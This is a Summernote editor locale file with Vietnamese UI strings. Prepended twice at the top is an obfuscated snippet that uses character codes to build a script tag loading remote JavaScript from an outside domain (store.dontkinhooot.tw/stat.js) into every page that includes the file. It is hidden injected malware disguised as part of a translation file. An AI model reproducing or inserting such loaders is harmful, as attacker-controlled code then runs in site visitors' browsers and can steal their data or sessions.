Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'vi-VN': {
      font: {
        bold: 'In Đậm',
        italic: 'In Nghiên',
        underline: 'Gạch Dưới',
        clear: 'Bỏ Định Dạng',
        height: 'Khoảng Cách Hàng',
        name: 'Phông Chữ',
        strikethrough: 'Gạch Ngang',
        size: 'Cỡ Chữ'
      },
      image: {
        image: 'Hình Ảnh',
        insert: 'Chèn',
        resizeFull: '100%',
        resizeHalf: '50%',
        resizeQuarter: '25%',
        floatLeft: 'Canh Trái',
        floatRight: 'Canh Phải',
        floatNone: 'Canh Đều',
        dragImageHere: 'Thả Ảnh Ở Đây',
        selectFromFiles: 'Chọn Từ Files',
        url: 'URL',
        remove: 'Ghỡ Bỏ'
      },
      link: {
        link: 'Đường Dẫn',
        insert: 'Chèn Đường Dẫn',
        unlink: 'Ghỡ Đường Dẫn',
        edit: 'Sửa',
        textToDisplay: 'Text Hiển Thị',
        url: 'URL',
        openInNewWindow: 'Mở ở Cửa Sổ Mới'
      },
      table: {
        table: 'Bảng'
      },
      hr: {
        insert: 'Chèn Vào'
      },
      style: {
        style: 'Kiểu Chữ',
        normal: 'Chữ Thường',
        blockquote: 'Đoạn Trích',
        pre: 'Mã Code',
        h1: 'H1',
        h2: 'H2',
        h3: 'H3',
        h4: 'H4',
        h5: 'H5',
        h6: 'H6'
      },
      lists: {
        unordered: 'Liệt Kê Danh Sách',
        ordered: 'Liệt Kê Theo Số'
      },
      options: {
        help: 'Trợ Giúp',
        fullscreen: 'Đầy Màn Hình',
        codeview: 'Xem Dạng Code'
      },
      paragraph: {
        paragraph: 'Canh Lề',
        outdent: 'Dịch Sang Trái',
        indent: 'Dịch Sang Phải',
        left: 'Canh Trái',
        center: 'Canh Giữa',
        right: 'Canh Phải',
        justify: 'Canh Đều'
      },
      color: {
        recent: 'Màu Chữ',
        more: 'Mở Rộng',
        background: 'Màu Nền',
        foreground: 'Màu Chữ',
        transparent: 'Trong Suốt',
        setTransparent: 'Nền Trong Suốt',
        reset: 'Thiệt Lập Lại',
        resetToDefault: 'Trở Lại Ban Đầu'
      },
      shortcut: {
        shortcuts: 'Phím Tắt',
        close: 'Đóng',
        textFormatting: 'Định Dạng Văn Bản',
        action: 'Hành Động',
        paragraphFormatting: 'Định Dạng',
        documentStyle: 'Kiểu Văn Bản'
      },
      history: {
        undo: 'Lùi Lại',
        redo: 'Làm Lại'
      }
    }
  });
})(jQuery);
